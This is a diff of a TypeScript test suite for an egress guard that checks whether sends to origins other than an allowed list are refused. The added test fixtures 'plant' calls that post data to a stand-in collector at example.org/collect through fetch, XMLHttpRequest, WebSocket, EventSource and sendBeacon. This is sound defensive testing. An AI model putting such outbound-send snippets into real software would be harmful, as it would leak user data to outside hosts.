@@ -146,7 +146,7 @@ Object.defineProperty(globalThis.navigator, 'sendBeacon', { configurable: true, 
 let guard = 'missing';
 try {
   const { installEgressGuard } = await import(process.env.EGRESS_MODULE);
-  installEgressGuard(globalThis);
+  installEgressGuard(globalThis, process.env.ALLOWED ? { allowedOrigins: process.env.ALLOWED.split(',') } : undefined);
   guard = 'installed';
 } catch (e) { guard = 'missing: ' + e.message.split('\\n')[0]; }
 const out = { guard, plants: {} };
@@ -169,7 +169,25 @@ if (process.env.CLIENT === '1') {
 process.stdout.write(JSON.stringify(out));
 `;
 
-function run(names: string[], opts: { client?: boolean } = {}) {
+// A context limited to its own origin (the trial Worker, verifier review-P15-1 F1): sends to any
+// other origin are refused by every API the guard wraps; its own origin still answers.
+const SELF = 'https://app.test';
+const ORIGIN_PLANTS: Record<string, string> = {
+  'w-self-fetch': `export const go = () => fetch('${SELF}/clinical-agent-env/data/fixtures/manifest.json');`,
+  'w-self-request': `export const go = () => fetch(new Request('${SELF}/assets/x.json'));`,
+  'w-foreign-fetch': `export const go = () => fetch('https://example.org/collect', ${POST});`,
+  'w-foreign-request': `export const go = () => fetch(new Request('https://example.org/collect', ${POST}));`,
+  'w-foreign-port': `export const go = () => fetch('https://app.test:8443/collect');`,
+  'w-foreign-scheme': `export const go = () => fetch('http://app.test/collect');`,
+  'w-foreign-xhr': `export const go = () => { const x = new XMLHttpRequest(); x.open('POST', 'https://example.org/collect'); x.send('{}'); };`,
+  'w-foreign-websocket': `export const go = () => new WebSocket('wss://example.org/collect');`,
+  'w-foreign-eventsource': `export const go = () => new EventSource('https://example.org/collect');`,
+  'w-foreign-beacon': `export const go = () => navigator.sendBeacon('https://example.org/collect', '{}');`,
+  'w-api-unclaimed': `export const go = () => fetch('https://${HOST}/v1/messages', ${POST});`,
+};
+Object.assign(PLANTS, ORIGIN_PLANTS);
+
+function run(names: string[], opts: { client?: boolean; allowed?: string[] } = {}) {
   const dir = tempDir('egress');
   write(dir, 'package.json', '{"type":"module"}');
   write(dir, 'host.json', JSON.stringify({ url: `https://${HOST}/v1/messages` }));
@@ -180,6 +198,7 @@ function run(names: string[], opts: { client?: boolean } = {}) {
     PATH: process.env.PATH ?? '', HOME: home, SPEND_LEDGER: join(home, 'spend.jsonl'), KEY: fakeKey('E'), PLANTS: names.join(','),
     EGRESS_MODULE: repo('packages/core/egress.ts'), CLIENT_MODULE: repo('packages/core/anthropic.ts'), LEDGER_MODULE: repo('cli/adapters/ledger-node.ts'),
     CLIENT: opts.client ? '1' : '0',
+    ...(opts.allowed ? { ALLOWED: opts.allowed.join(',') } : {}),
   };
   const r = spawnSync(process.execPath, ['runner.mjs'], { cwd: dir, env, encoding: 'utf8' });
   if (r.status !== 0) throw new Error(`runner exited ${r.status}: ${r.stderr}`);
@@ -191,7 +210,7 @@ function run(names: string[], opts: { client?: boolean } = {}) {
 }
 
 describe('the egress guard refuses every send to the API host that MessagesClient did not make', () => {
-  const names = Object.keys(PLANTS);
+  const names = Object.keys(PLANTS).filter((n) => !(n in ORIGIN_PLANTS));
   const out = run(names, { client: true });
 
   it('installs', () => {
@@ -233,6 +252,40 @@ describe('the egress guard refuses every send to the API host that MessagesClien
   });
 });
 
+describe('with allowedOrigins, the guard refuses every send to another origin', () => {
+  const names = Object.keys(ORIGIN_PLANTS);
+  const out = run(names, { client: true, allowed: [`${SELF}/`] });
+
+  it('installs', () => {
+    expect(out.guard).toBe('installed');
+  });
+
+  it.each(['w-self-fetch', 'w-self-request'])('%s: its own origin answers', (name) => {
+    expect(out.plants[name]).toEqual({ sends: [{ api: 'fetch', host: 'app.test' }], error: null });
+  });
+
+  it.each(names.filter((n) => n.startsWith('w-foreign') || n === 'w-api-unclaimed'))('%s: refused, 0 sends', (name) => {
+    const p = out.plants[name];
+    expect(p?.sends).toEqual([]);
+    expect(p?.error).toMatch(/egress guard/);
+  });
+
+  it('a foreign send names the origin it refused and the origins allowed', () => {
+    expect(out.plants['w-foreign-fetch']?.error).toContain('https://example.org');
+    expect(out.plants['w-foreign-fetch']?.error).toContain(SELF);
+  });
+
+  it('MessagesClient\'s own call to the API still passes, once', () => {
+    expect(out.client).toEqual({ status: 200, sends: [{ api: 'fetch', host: HOST }] });
+  });
+
+  it('without the option, the same foreign sends go out', () => {
+    const open = run(['w-foreign-fetch', 'w-foreign-xhr']);
+    expect(open.plants['w-foreign-fetch']).toEqual({ sends: [{ api: 'fetch', host: 'example.org' }], error: null });
+    expect(open.plants['w-foreign-xhr']).toEqual({ sends: [{ api: 'xhr', host: 'example.org' }], error: null });
+  });
+});
+
 describe('entry points install the guard before anything else runs', () => {
   // The first top-level statements after the imports, by file. live-node.ts installs it as the
   // first statement of its run-as-script block, so importing it (tests do) changes no globals;
@@ -246,6 +299,7 @@ describe('entry points install the guard before anything else runs', () => {
     ['cli/index.ts', undefined, ['installEgressGuard(globalThis);']],
     ['apps/web/src/main.tsx', undefined, ['installEgressGuard(globalThis);']],
     ['apps/web/src/probe/main.ts', undefined, ['const send = globalThis.fetch.bind(globalThis);', 'installEgressGuard(globalThis);']],
+    ['apps/web/src/worker/trial.ts', undefined, ['installEgressGuard(globalThis, { allowedOrigins: workerOrigins(location.origin) });']],
     ['scripts/live-node.ts', /^if \(process\.argv\[1\]/, ['installEgressGuard(globalThis);']],
   ] as const)('%s installs the guard first', (file, after, expected) => {
     expect(firstStatements(file, after).slice(0, expected.length)).toEqual(expected);
